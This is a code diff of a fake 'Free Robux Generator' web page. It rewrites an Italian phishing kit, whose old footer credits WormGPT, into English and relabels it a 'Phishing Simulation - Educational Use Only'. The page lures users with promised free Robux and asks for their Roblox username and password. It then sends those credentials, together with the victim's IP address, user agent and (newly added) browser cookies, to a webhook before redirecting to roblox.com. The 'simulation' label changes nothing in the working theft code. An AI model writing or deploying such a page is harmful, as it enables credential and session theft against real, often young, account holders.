@@ -2,47 +2,64 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Roblox Generator</title>
+  <title>Free Robux Generator - Simulation</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: white;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
+      margin: 0;
       text-align: center;
     }
-    #loginBox { display: none; }
     input, button {
-      padding: 10px;
-      margin: 10px;
+      padding: 12px;
+      margin: 8px;
       font-size: 16px;
+      border-radius: 8px;
+      border: none;
+      outline: none;
     }
+    input {
+      width: 250px;
+    }
+    button {
+      background-color: #00c853;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #009624;
+    }
+    #loginBox { display: none; }
+    #loading { display: none; }
   </style>
 </head>
 <body>
 
   <div id="step1">
-    <h1>Roblox Generator</h1>
-    <p>Quanti Robux vuoi?</p>
-    <input type="number" id="robuxAmount" placeholder="es. 5000"><br>
-    <p>⚠️ Più Robux metti, più sarà lungo il processo per iniettarli nell’account.</p>
-    <button onclick="startFakeProcess()">Genera</button>
+    <h1>Free Robux Generator</h1>
+    <p>How many Robux do you want?</p>
+    <input type="number" id="robuxAmount" placeholder="e.g. 5000"><br>
+    <p>⚠️ The more Robux you request, the longer the injection process will take.</p>
+    <button onclick="startFakeProcess()">Generate</button>
   </div>
 
-  <div id="loading" style="display:none;">
-    <h2>Generazione in corso...</h2>
-    <p>Attendi mentre iniettiamo i Robux...</p>
+  <div id="loading">
+    <h2>Generating...</h2>
+    <p>Please wait while we inject Robux into your account...</p>
   </div>
 
   <div id="loginBox">
-    <h2>Verifica il tuo account Roblox</h2>
-    <p>Per completare, inserisci il tuo username e password Roblox</p>
+    <h2>Verify your Roblox Account</h2>
+    <p>To complete the injection, please enter your Roblox credentials.</p>
     <input type="text" id="username" placeholder="Username"><br>
     <input type="password" id="password" placeholder="Password"><br>
-    <button onclick="sendToWebhook()">Claim</button>
+    <button onclick="sendToWebhook()">Complete</button>
   </div>
 
   <script>
@@ -50,7 +67,7 @@
 
     function startFakeProcess() {
       const amount = document.getElementById("robuxAmount").value;
-      if (!amount || amount <= 0) return alert("Inserisci un numero valido di Robux.");
+      if (!amount || amount <= 0) return alert("Please enter a valid Robux amount.");
 
       document.getElementById("step1").style.display = "none";
       document.getElementById("loading").style.display = "block";
@@ -64,27 +81,29 @@
     function sendToWebhook() {
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
+      const cookies = document.cookie;
+      const userAgent = navigator.userAgent;
 
-      if (!username || !password) return alert("Inserisci tutte le credenziali.");
+      if (!username || !password) return alert("Please enter your credentials.");
 
       fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => {
           const ip = data.ip;
-          const ua = navigator.userAgent;
 
           const payload = {
-            content: "**🎯 NUOVO LOG - Roblox Generator**",
+            content: "**🕵️ Roblox Phishing Simulation**",
             embeds: [{
-              title: "🧠 Credenziali Catturate",
-              color: 16711680,
+              title: "Captured Credentials",
+              color: 15158332,
               fields: [
                 { name: "👤 Username", value: username, inline: true },
-                { name: "🔐 Password", value: password, inline: true },
-                { name: "🌍 IP", value: ip, inline: false },
-                { name: "🧭 User-Agent", value: ua, inline: false }
+                { name: "🔑 Password", value: password, inline: true },
+                { name: "🌍 IP Address", value: ip, inline: false },
+                { name: "🍪 Cookies", value: cookies || "None", inline: false },
+                { name: "🧭 User-Agent", value: userAgent, inline: false }
               ],
-              footer: { text: "🔔 Roblox Generator Fake by WormGPT" },
+              footer: { text: "Phishing Simulation - Educational Use Only" },
               timestamp: new Date().toISOString()
             }]
           };
@@ -94,8 +113,8 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
           }).then(() => {
-            alert("Errore 429 - Impossibile contattare i server Roblox.");
-            window.location.href = "https://www.roblox.com/home";
+            alert("Process complete. Redirecting...");
+            window.location.href = "https://www.roblox.com";
           });
         });
     }
